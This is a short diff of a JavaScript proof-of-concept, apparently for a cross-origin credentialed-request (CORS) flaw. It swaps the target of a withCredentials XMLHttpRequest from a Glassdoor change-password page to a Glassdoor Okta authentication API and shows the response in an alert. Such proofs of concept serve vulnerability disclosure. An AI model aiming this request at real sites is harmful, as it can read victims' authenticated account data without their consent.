@@ -16,7 +16,7 @@ if (this.readyState == 4 && this.status == 200) {
 document.getElementById("demo").innerHTML = alert(this.responseText);
 }
 };
-xhttp.open("GET", "https://www.glassdoor.co.in/profile/changePassword_execute.htm", true);
+xhttp.open("GET", "https://glassdoor.okta.com/api/v1/authn", true);
 xhttp.withCredentials = true;
 xhttp.send();
 }
